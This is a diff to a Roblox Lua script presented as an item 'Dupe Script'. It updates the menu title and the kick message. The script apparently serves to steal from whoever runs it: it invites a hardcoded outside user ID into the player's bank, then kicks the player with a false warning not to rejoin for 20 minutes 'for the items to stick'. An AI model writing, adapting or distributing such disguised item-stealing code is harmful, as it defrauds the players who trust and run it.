@@ -1,7 +1,7 @@
 local args = {  [1] = "", [2] = "All" }
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
- lib.Message.New("Dupe Script [Fast Mode]" , "Select the other option" , "Start Process");
+ lib.Message.New("Dupe Script [EGDIRBMA]" , "Manual Dupe [IN BANK ALREADY]" , "Automatic Dupe");
  
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mybanks = lib.Network.Invoke("get my banks")
@@ -20,9 +20,9 @@ else
 end
  
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3803443851) then
-game.Players.LocalPlayer:Kick("Don't join the game for the next 20mins to stop the pets from getting deleted") lib.Message.New("")
+game.Players.LocalPlayer:Kick("Don't join the game for the next 20mins for the items to stick") lib.Message.New("")
 else
-    game.Players.LocalPlayer:Kick("Don't join the game for the next 20mins to stop the pets from getting deleted")
+    game.Players.LocalPlayer:Kick("Don't join the game for the next 20mins for the items to stick")
 function comma_value(amount)
  
   local formatted = amount
